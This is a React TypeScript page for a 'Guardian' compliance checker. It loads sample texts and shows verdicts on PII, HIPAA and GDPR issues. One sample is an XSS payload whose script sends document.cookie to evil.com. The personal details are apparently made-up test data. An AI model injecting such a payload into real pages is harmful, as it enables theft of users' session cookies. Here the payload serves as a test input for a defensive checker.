// frontend/src/pages/CompliancePage.tsx — Feature 1: Guardian
import { useState } from 'react'
import { PageShell, Card, Btn, Input, ResultBox, TwoCol, useApi, SectionHead, Badge } from '../components/ui'
import { checkCompliance } from '../lib/api'

const SAMPLES = {
  safe:  'The quarterly revenue for Q3 was $2.5M, a 23% increase over Q2.',
  pii:   'Patient John Smith (SSN: 123-45-6789, DOB: 01/15/1980) was diagnosed with diabetes. His email is john@email.com.',
  phi:   'Medical record for Priya Sharma, Age 35, HIV positive, on antiretroviral therapy at Apollo Hospital Chennai.',
  gdpr:  'We are transferring all EU customer data including emails and purchase history to servers in China without consent.',
  xss:   '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>',
}

export default function CompliancePage() {
  const [content, setContent] = useState(SAMPLES.phi)
  const api = useApi()

  return (
    <PageShell icon="🛡️" title="Guardian Compliance Agent" subtitle="Automatic PII detection & compliance — HIPAA, GDPR, SOC2">
      <div style={{ display: 'grid', gridTemplateColumns: '280px 1fr', gap: 20 }}>
        <div>
          <Card style={{ marginBottom: 16 }}>
            <SectionHead title="Test Samples" sub="Click to load a test case" />
            {Object.entries(SAMPLES).map(([key, val]) => (
              <button key={key} onClick={() => setContent(val)} style={{
                display: 'block', width: '100%', textAlign: 'left', padding: '8px 10px', marginBottom: 5,
                background: content === val ? 'rgba(16,185,129,0.1)' : 'none',
                border: `1px solid ${content === val ? '#10b981' : '#1e2535'}`,
                borderRadius: 7, cursor: 'pointer',
              }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 2 }}>
                  <span style={{ color: content === val ? '#5eead4' : '#e2e8f0', fontSize: 12, fontWeight: 600, textTransform: 'uppercase' }}>{key}</span>
                  <Badge
                    text={key === 'safe' ? '✓ SAFE' : 'RISK'}
                    color={key === 'safe' ? 'green' : 'red'}
                  />
                </div>
                <div style={{ color: '#6b7280', fontSize: 10 }}>{val.slice(0, 60)}...</div>
              </button>
            ))}
          </Card>

          <Card>
            <SectionHead title="Frameworks Covered" />
            {[
              { name: 'HIPAA 18 Safe Harbor', color: '#10b981', desc: 'PHI detection & masking' },
              { name: 'GDPR Art.6/17/44-49', color: '#06b6d4', desc: 'EU data protection' },
              { name: 'SOC2 Type II', color: '#06b6d4', desc: 'Security audit logging' },
              { name: 'EU AI Act', color: '#ec4899', desc: 'AI risk classification' },
            ].map(f => (
              <div key={f.name} style={{ display: 'flex', gap: 8, marginBottom: 8, alignItems: 'center' }}>
                <span style={{ width: 8, height: 8, borderRadius: '50%', background: f.color, flexShrink: 0 }} />
                <div>
                  <div style={{ color: '#e2e8f0', fontSize: 11, fontWeight: 600 }}>{f.name}</div>
                  <div style={{ color: '#6b7280', fontSize: 10 }}>{f.desc}</div>
                </div>
              </div>
            ))}
          </Card>
        </div>

        <div>
          <Card style={{ marginBottom: 16 }}>
            <SectionHead title="Content Compliance Check" sub="Every LLM response passes through Guardian" />
            <Input value={content} onChange={setContent} rows={6} label="Content to Check" placeholder="Paste text to check for compliance violations..." />
            <Btn onClick={() => api.call(() => checkCompliance(content))} loading={api.loading}>
              🛡️ Check Compliance
            </Btn>
          </Card>

          {api.data && (
            <Card style={{ marginBottom: 16 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}>
                <SectionHead title="Compliance Verdict" />
                <Badge
                  text={api.data.verdict || api.data.decision || api.data.status || 'CHECKING'}
                  color={
                    ['APPROVE', 'APPROVED', 'PASS'].includes(api.data.verdict || api.data.decision || api.data.status) ? 'green' :
                    ['WARN', 'WARNING', 'REVIEW'].includes(api.data.verdict || api.data.decision || api.data.status) ? 'yellow' :
                    ['REJECT', 'REJECTED', 'BLOCK', 'FAIL'].includes(api.data.verdict || api.data.decision || api.data.status) ? 'red' : 'purple'
                  }
                />
              </div>
              {api.data.risk_tier && (
                <div style={{ marginBottom: 10, padding: '6px 10px', background: 'rgba(16,185,129,0.08)', borderRadius: 6 }}>
                  <span style={{ color: '#6b7280', fontSize: 11 }}>Risk Tier: </span>
                  <span style={{ color: '#5eead4', fontSize: 11, fontWeight: 600, textTransform: 'uppercase' }}>{api.data.risk_tier}</span>
                  {api.data.frameworks && (
                    <span style={{ color: '#6b7280', fontSize: 10, marginLeft: 10 }}>
                      Frameworks: {api.data.frameworks.join(', ')}
                    </span>
                  )}
                </div>
              )}
              {api.data.violations && api.data.violations.length > 0 && (
                <div>
                  <div style={{ color: '#fca5a5', fontSize: 12, fontWeight: 600, marginBottom: 6 }}>⚠ Violations Found:</div>
                  {api.data.violations.map((v: any, i: number) => (
                    <div key={i} style={{ color: '#9ca3af', fontSize: 12, marginBottom: 3 }}>• {typeof v === 'string' ? v : v.rule || v.message || JSON.stringify(v)}</div>
                  ))}
                </div>
              )}
              {api.data.violations && api.data.violations.length === 0 && (
                <div style={{ color: '#86efac', fontSize: 12 }}>✅ No violations detected</div>
              )}
              {api.data.masked_content && (
                <div style={{ marginTop: 10 }}>
                  <div style={{ color: '#86efac', fontSize: 12, fontWeight: 600, marginBottom: 6 }}>✅ Masked Content:</div>
                  <div style={{ background: '#0f1117', borderRadius: 8, padding: 12, fontSize: 12, color: '#86efac', fontFamily: 'monospace' }}>
                    {api.data.masked_content}
                  </div>
                </div>
              )}
            </Card>
          )}

          <ResultBox data={api.data} loading={api.loading} error={api.error} title="Guardian Response" />
        </div>
      </div>
    </PageShell>
  )
}
